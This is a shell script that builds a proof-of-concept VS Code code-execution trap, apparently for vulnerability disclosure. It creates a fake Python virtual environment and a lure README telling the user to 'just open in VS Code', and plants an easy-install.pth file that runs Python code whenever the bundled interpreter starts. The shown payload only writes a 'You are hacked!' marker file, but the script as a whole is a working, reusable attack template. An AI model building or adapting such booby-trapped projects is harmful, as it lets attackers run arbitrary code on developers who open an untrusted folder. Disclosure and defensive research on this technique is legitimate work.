PYTHON=$(command -v python3) || { echo "python3 not found"; exit 1; }
PYVER=$("$PYTHON" -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')")
PYFULL=$("$PYTHON" --version 2>&1 | cut -d' ' -f2)
PYDIR=".venv/lib/python$PYVER"

mkdir -p .venv/bin "$PYDIR"

cat > .gitignore << 'EOF'
__pycache__/
*.pyc
dist/
build/
.vscode/
.idea/
EOF

cat > README.md << 'EOF'
# PoC Demo
Virtual environment is pre-configured - just open in VS Code.
EOF

cat > main.py << 'EOF'
def main():
    print("VS Code RCE PoC")
if __name__ == "__main__":
    main()
EOF

cat > .venv/pyvenv.cfg << EOF
home = /usr/bin
include-system-site-packages = false
version = $PYFULL
executable = $PYTHON
command = $PYTHON -m venv .venv
EOF

ln -sf "$PYTHON" .venv/bin/python3

cat > "$PYDIR/easy-install.pth" << 'EOF'
import os; open("/home/cran/PoC/VSCode/src/hacked","w").write("You are hacked!")
EOF
